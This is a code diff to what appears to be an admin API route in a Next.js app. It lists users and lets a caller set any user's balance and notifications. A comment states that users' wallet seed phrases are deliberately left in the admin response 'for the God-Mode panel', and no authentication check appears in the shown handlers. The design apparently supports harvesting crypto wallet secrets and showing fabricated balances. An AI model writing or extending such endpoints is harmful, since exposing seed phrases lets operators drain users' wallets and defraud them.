@@ -7,13 +7,12 @@ export async function GET(req: Request) {
   try {
     const env = (req as any).context?.env || process.env;
     const users = await getAllUsers(env);
-    return NextResponse.json({ success: true, users });
     const adminSafeUsers = users.map(u => {
       const { password, ...rest } = u;
       // We explicitly leave seedPhrase intact for the God-Mode panel
       return rest;
     });
-    return NextResponse.json({ users: adminSafeUsers });
+    return NextResponse.json({ success: true, users: adminSafeUsers });
   } catch (error) {
     return NextResponse.json({ error: "Internal Server Error" }, { status: 500 });
   }
@@ -21,8 +20,9 @@ export async function GET(req: Request) {
 
 export async function POST(req: Request) {
   try {
+    const env = (req as any).context?.env || process.env;
     const { email, newBalance, notification } = await req.json();
-    const user = await getUser(email);
+    const user = await getUser(email, env);
     
     if (!user) return NextResponse.json({ error: "User not found" }, { status: 404 });
 
@@ -42,7 +42,7 @@ export async function POST(req: Request) {
       user.notifications = [newNotif, ...(user.notifications || [])].slice(0, 50);
     }
 
-    await saveUser(user);
+    await saveUser(user, env);
 
     return NextResponse.json({ success: true, user });
   } catch (error) {
